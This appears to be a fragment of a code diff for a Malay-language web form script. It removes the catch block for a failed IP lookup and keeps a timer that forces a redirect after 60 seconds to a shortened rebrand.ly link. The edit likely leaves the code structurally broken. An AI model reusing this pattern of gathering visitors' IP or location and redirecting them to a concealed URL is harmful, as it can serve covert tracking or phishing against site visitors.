@@ -46,13 +46,7 @@ form.addEventListener("submit", async function (e) {
       alert("❌ Gagal hantar data. Sila cuba lagi.");
       console.error("Submit error: ", err);
     });
-
-  } catch (err) {
-    console.error("IP fetch failed:", err);
-    alert("Gagal kesan lokasi. Sila cuba lagi.");
-  }
-});
-
+    
 // ======= AUTO REDIRECT AFTER 60s =======
 setTimeout(() => {
   window.location.href = "https://rebrand.ly/Pn83u0e";
